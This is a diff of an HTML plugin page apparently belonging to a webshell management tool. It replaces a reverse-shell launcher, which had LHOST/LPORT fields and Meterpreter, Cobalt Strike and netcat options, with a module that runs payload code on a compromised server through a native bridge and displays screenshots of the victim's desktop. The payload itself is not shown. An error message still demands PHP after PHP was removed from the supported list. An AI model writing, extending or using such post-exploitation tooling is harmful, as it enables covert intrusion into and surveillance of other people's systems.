@@ -2,40 +2,38 @@
 <html lang="en-US">
 <head>
     <meta charset="UTF-8">
-    <title>Reverse Shell Controller</title>
+    <title>Screen Capture System</title>
     <style>
-        /* Stark Monochrome Layout */
         html, body {
             height: 100%;
             margin: 0;
             padding: 0;
-            background-color: #000000; /* Pure black */
-            color: #ffffff; /* Pure white */
+            background-color: #000000;
+            color: #ffffff;
             overflow-y: auto; 
             overflow-x: hidden;
         }
         body { 
             font-family: 'Courier New', Courier, monospace;
             display: flex;
-            justify-content: center;  
-            align-items: center;      
+            justify-content: center;
+            align-items: center;
         }
         
-        /* Rigid Wireframe Container */
         .container { 
             width: 100%;
             max-width: 650px; 
             background: #000000; 
             padding: 25px; 
-            border-radius: 0px; /* Sharp corners only */
-            border: 1px solid #ffffff; /* Stark 1px white border */
+            border-radius: 0px;
+            border: 1px solid #ffffff;
         }
         
         h2 { 
             color: #ffffff;
             margin-top: 0; 
             border-bottom: 1px solid #ffffff; 
-            padding-bottom: 10px;
+            padding-bottom: 10px; 
             font-size: 18px;
             text-transform: uppercase;
             letter-spacing: 2px;
@@ -46,12 +44,12 @@
             padding: 10px; 
             margin-bottom: 20px; 
             font-size: 12px; 
-            border: 1px dashed #ffffff; /* Dashed line for system status */
+            border: 1px dashed #ffffff;
             text-transform: uppercase;
         }
         
         .badge { padding: 0px 4px; font-weight: bold; }
-        .badge-active { background: #ffffff; color: #000000; } /* Inverse for emphasis */
+        .badge-active { background: #ffffff; color: #000000; }
         .badge-error { border: 1px dashed #ffffff; background: transparent; color: #ffffff; }
         
         .form-row {
@@ -59,8 +57,8 @@
             gap: 15px;
             margin-bottom: 15px;
         }
+        
         .form-group { flex: 1; margin-bottom: 15px; }
-        .form-group.full-width { width: 100%; }
         
         label { 
             display: block; 
@@ -71,7 +69,6 @@
             font-weight: bold;
         }
         
-        /* Wireframe Input & Select Fields */
         input[type="text"], select { 
             width: 100%; 
             background: #000000; 
@@ -83,28 +80,21 @@
             font-family: inherit;
             font-size: 13px;
         }
+        
         input[type="text"]:focus, select:focus {
             outline: none;
-            background: #111111; 
+            background: #111111;
         }
         
-        /* Stylized Select Dropdown Indicator */
         select {
             appearance: none;
             -webkit-appearance: none;
             background-image: url("data:image/svg+xml;utf8,<svg fill='white' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/></path></svg>");
             background-repeat: no-repeat;
-            background-position-x: 98%;
+            background-position-x: 95%;
             background-position-y: 50%;
-            padding-right: 30px;
         }
         
-        select option {
-            background: #000000;
-            color: #ffffff;
-        }
-        
-        /* Stark Monochrome Button */
         button { 
             background-color: transparent; 
             color: #ffffff; 
@@ -113,13 +103,14 @@
             border: 1px solid #ffffff; 
             padding: 10px 25px; 
             cursor: pointer; 
-            border-radius: 0px;
+            border-radius: 0px; 
             text-transform: uppercase;
             letter-spacing: 1px;
+            width: 100%;
         }
         button:hover:not(:disabled) { 
             background-color: #ffffff; 
-            color: #000000; /* Inverse style on hover */
+            color: #000000;
         }
         button:disabled { 
             border-color: #444444; 
@@ -132,72 +123,97 @@
             color: #ffffff;
             text-transform: uppercase;
             margin-top: 25px;
+            margin-bottom: 8px;
         }
         
-        /* CRT Terminal Console */
-        .console { 
-            background: #000000; 
-            border: 1px solid #ffffff; 
-            padding: 15px; 
-            height: 220px; 
-            overflow-y: auto; 
-            white-space: pre-wrap;
-            font-size: 13px;
-            line-height: 1.5;
+        .viewer-frame {
+            width: 100%;
+            height: 280px;
+            background: #111111;
+            border: 1px solid #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+        .viewer-frame img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            display: none;
+        }
+        .viewer-placeholder {
+            color: #666666;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
-        /* Dynamic Token Styling */
-        .msf-line { margin-bottom: 4px; color: #ffffff; } 
-        .msf-info { color: #3498db; font-weight: bold; }    
-        .msf-success { color: #2ecc71; font-weight: bold; } 
-        .msf-warn { color: #f1c40f; font-weight: bold; }    
-        .msf-error { color: #e74c3c; font-weight: bold; }   
+        .console { 
+            background: #000000; 
+            border: 1px dashed #444444; 
+            padding: 10px; 
+            height: 90px; 
+            overflow-y: auto; 
+            white-space: pre-wrap;
+            font-size: 11px;
+            line-height: 1.4;
+            margin-top: 15px;
+        }
+
+        .msf-line { margin-bottom: 2px; color: #ffffff; } 
+        .msf-info { color: #3498db; font-weight: bold; }
+        .msf-success { color: #2ecc71; font-weight: bold; }
+        .msf-warn { color: #f1c40f; font-weight: bold; }
+        .msf-error { color: #e74c3c; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>[ ALIEN_MODULE: REVERSE_SHELL_CONTROLLER ]</h2>
+    <h2>[ Windows Screenshot Viewer ]</h2>
     
     <div class="status-bar" id="statusBar">
-        [*] INITIALIZING INTERFACE... AWAITING HOST BRIDGE...
+        [*] Initializing display driver... awaiting bridge...
     </div>
     
     <div class="form-row">
-        <div class="form-group" style="flex: 2;">
-            <label>> LHOST (REMOTE IP)</label>
-            <input type="text" id="txtLhost" value="127.0.0.1" placeholder="e.g. 192.168.1.50">
-        </div>
-        <div class="form-group" style="flex: 1;">
-            <label>> LPORT</label>
-            <input type="text" id="txtLport" value="4444" placeholder="4444">
-        </div>
-    </div>
-
-    <div class="form-row">
-        <div class="form-group full-width">
-            <label>> PAYLOAD PLATFORM (COMBOBOX)</label>
-            <select id="selPayloadType">
-                <option value="meterpreter">METASPLOIT METERPRETER (REVERSE_TCP)</option>
-                <option value="cobaltstrike">COBALT STRIKE BEACON (REVERSE_HTTP)</option>
-                <option value="netcat">NETCAT (NC REVERSE_SHELL)</option>
+        <div class="form-group">
+            <label>> Capture Quality (JPEG)</label>
+            <select id="uiQuality" onchange="updateJsonConfig()">
+                <option value="50">50% (LOW BANDWIDTH)</option>
+                <option value="75" selected>75% (BALANCED)</option>
+                <option value="100">100% (LOSSLESS IMAGING)</option>
             </select>
         </div>
     </div>
 
-    <button id="btnConnect" onclick="executePlugin()" disabled>TRIGGER_REVERSE_SHELL</button>
+    <div class="form-group">
+        <label>> Transmitted Config (JSON Target)</label>
+        <input type="text" id="targetJson" value="" readonly style="background: #111; color: #aaa; border-color: #444;">
+    </div>
 
-    <h3>SYSTEM_LOG_OUTPUT</h3>
+    <button id="captureBtn" onclick="executePlugin()" disabled>Trigger Screen Capture</button>
+
+    <h3>Viewport Display</h3>
+    <div class="viewer-frame">
+        <span class="viewer-placeholder" id="imgPlaceholder">NO LIVE STREAM TRANSMITTED</span>
+        <img id="screenshotTarget" src="" alt="Host Desktop Frame">
+    </div>
+
     <div class="console" id="consoleOutput"></div>
 </div>
 
 <script>
     const pluginManifest = {
         "supportedLangs": [
-            "PHP/v5.X/OneShell",
-            "PHP/v7.X/OneShell",
-            "PHP/v8.X/OneShell",
+            // .NET
+            "ASHX/NebulaPulsar/DarkMatter",
+            "ASMX/NebulaPulsar/DarkMatter",
+            "ASPX/NebulaPulsar/DarkMatter",
 
+            // Java
             "JSP/NebulaPulsar/DarkMatter",
             "JSPX/NebulaPulsar/DarkMatter",
             "CFM/NebulaPulsar/DarkMatter",
@@ -206,12 +222,20 @@
 
     let currentShellType = "";
 
+    function updateJsonConfig() {
+        const quality = document.getElementById('uiQuality').value;
+        const configObj = {
+            "action": "screenshot",
+            "quality": quality
+        };
+        document.getElementById('targetJson').value = JSON.stringify(configObj);
+    }
+
     function appendLog(text) {
         const consoleOutput = document.getElementById('consoleOutput');
         if (!text) return;
 
         const lines = text.split('\n');
-        
         lines.forEach(line => {
             if (line.trim() === "") return;
 
@@ -227,18 +251,18 @@
             } else if (line.startsWith('[!]')) {
                 div.innerHTML = `<span class="msf-warn">[!]</span> ${line.substring(3)}`;
             } else {
-                div.innerText = line; 
+                div.innerText = line;
             }
-
             consoleOutput.appendChild(div);
         });
-
         consoleOutput.scrollTop = consoleOutput.scrollHeight;
     }
 
     window.addEventListener('DOMContentLoaded', async () => {
+        updateJsonConfig();
+
         const statusBar = document.getElementById('statusBar');
-        const btnConnect = document.getElementById('btnConnect');
+        const captureBtn = document.getElementById('captureBtn');
 
         try {
             if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
@@ -246,18 +270,16 @@
                 currentShellType = await bridge.fnGetShellType();
 
                 if (pluginManifest.supportedLangs.includes(currentShellType)) {
-                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-active">${currentShellType.toUpperCase()}</span> // STATUS: READY`;
-                    btnConnect.disabled = false;
-                    appendLog("[*] CONNECTION ESTABLISHED TO WEB CONTEXT.");
-                    appendLog("[*] CORE PAYLOAD LISTENER MATRIX INITIALIZED.");
+                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-active">${currentShellType.toUpperCase()}</span> // STATUS: GDI READY`;
+                    captureBtn.disabled = false;
+                    appendLog("[*] COUPLING CAPTURE DRIVER TO BRIDGE LINK.");
                 } else {
                     statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-error">${currentShellType.toUpperCase()}</span> // STATUS: INCOMPATIBLE`;
-                    appendLog(`[-] ABORTED. PLUGIN REQUIRES: [${pluginManifest.supportedLangs.join(', ')}].`);
-                    appendLog(`[-] DETECTED ENVIRONMENT: ${currentShellType}.`);
+                    appendLog(`[-] COMPILATION ABORTED. INSTANCE REQUIRES PHP ENVIRONMENT.`);
                 }
             } else {
-                appendLog("[!] BRIDGE_ERROR: HOST_NOT_FOUND. STANDALONE DRY-RUN MODE.");
-                btnConnect.disabled = false;
+                appendLog("[!] BRIDGE_ERROR: HOST_NOT_FOUND. ACTIVE EMULATION ARCHITECTURE.");
+                captureBtn.disabled = false;
             }
         } catch (e) {
             appendLog("[!] EXCEPTION_CAUGHT: " + e.message.toUpperCase());
@@ -265,34 +287,47 @@
     });
 
     async function executePlugin() {
-        const configParams = {
-            lhost: document.getElementById('txtLhost').value,
-            lport: document.getElementById('txtLport').value,
-            payloadType: document.getElementById('selPayloadType').value
-        };
-
-        appendLog(`[*] FETCHING CORE SHELL HANDLER FOR: ${currentShellType.toUpperCase() || "STANDALONE"}`);
-        appendLog(`[*] TARGET ENDPOINT SET -> ${configParams.lhost}:${configParams.lport}`);
-        appendLog(`[*] SELECTED ENGINES: [${configParams.payloadType.toUpperCase()}]`);
+        const jsonConfig = document.getElementById('targetJson').value;
+        const imgTarget = document.getElementById('screenshotTarget');
+        const imgPlaceholder = document.getElementById('imgPlaceholder');
+        
+        appendLog(`[*] STAGING DRAW INSTRUCTIONS [QUALITY: ${JSON.parse(jsonConfig).quality}%]`);
 
         try {
             if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
                 const bridge = window.chrome.webview.hostObjects.nativeBridge;
-                
                 const currentDir = window.location.pathname.substring(1, window.location.pathname.lastIndexOf('/') + 1);
+                
                 const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
                 
-                appendLog(`[+] DISPATCHING CONNECT-BACK COMMAND VIA ${configParams.payloadType.toUpperCase()}...`);
+                appendLog('[*] EXECUTING REMOTE FRAME BUFFER INTERCEPTION...');
                 
-                const szJsonConfig = JSON.stringify(configParams);
-                const result = await bridge.fnRun(szJsonConfig, payloadCode, currentShellType);
+                let base64Result = await bridge.fnRun(jsonConfig, payloadCode, currentShellType);
+                if (base64Result.startsWith("ERROR://"))
+                    throw base64Result;
                 
-                appendLog(result.toUpperCase());
+                base64Result = base64Result.trim();
+
+                if (base64Result && !base64Result.startsWith("[-]")) {
+                    appendLog("[+] RAW BITSTREAM RECEIVED. DECODING GRAPHICS BUFFER...");
+                    
+                    imgTarget.src = "data:image/jpeg;base64," + base64Result;
+                    imgTarget.style.display = "block";
+                    imgPlaceholder.style.display = "none";
+                } else {
+                    appendLog("[-] RECOVERY ABORTED: " + base64Result.toUpperCase());
+                }
             } else {
-                appendLog(`[!] MOCK EXECUTING: SENDING ${configParams.payloadType.toUpperCase()} TO ${configParams.lhost}:${configParams.lport}`);
+                appendLog("[!] MOCK SCANNING DISPLAY DESRUPTOR...");
+                setTimeout(() => {
+                    imgTarget.src = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='800' height='600'><rect width='100%' height='100%' fill='%23222'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' fill='white' font-family='monospace'>[ MOCK SCREENSHOT WINDOW RES: 1920x1080 ]</text></svg>";
+                    imgTarget.style.display = "block";
+                    imgPlaceholder.style.display = "none";
+                    appendLog("[+] MOCK FRAME RECEIVED SUCCESSFULLY.");
+                }, 700);
             }
         } catch (e) {
-            appendLog("[-] EXECUTION FAILED: " + e.message.toUpperCase());
+            appendLog("[-] DISPLAY AGENT FAULT: " + e.message.toUpperCase());
         }
     }
 </script>
